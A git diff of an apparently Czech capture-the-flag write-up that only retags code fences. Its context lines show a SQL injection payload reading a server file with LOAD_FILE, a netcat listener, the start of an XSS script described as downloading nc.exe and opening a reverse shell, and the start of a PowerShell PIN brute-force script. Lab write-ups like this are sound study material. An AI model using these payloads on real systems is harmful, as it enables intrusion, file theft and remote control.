@@ -112,7 +112,7 @@ Hopelessromantic
 ### Načtení obsahu backdoorchecker.php z výchozí složky Xampp
 - `1' UNION SELECT 1,LOAD_FILE('C:\\xampp\\htdocs\\admin\\backdoorchecker.php'),3-- -`
 Obsah se lépe čte pomocí Developer tools prohlížeče na záložce Network
-```
+```php
 <?php
 include('../link.php');
 include('auth.php');
@@ -161,7 +161,7 @@ Příprava netcatu
 `nc -lvp 4000`
 Odeslání formuláře s následujícím komentářem (IP.AD.RE.SA nahradit vlastní IP) a počkat
 Skript stáhne nc.exe a otevře reverzní shell
-```
+```js
 <script>
 function mycallSys(cmd){
 var http=new XMLHttpRequest();
@@ -232,7 +232,7 @@ bankv2.exe                    1456                            0         96 K
 
 ### Rozlousknutí PINu
 PowerShell skript brute.ps1 připravíme do stejné složky jako nc.exe
-```
+```powershell
 [int] $Port = 910
 $IP = "127.0.0.1"
 $Address = [system.net.IPAddress]::Parse($IP) 
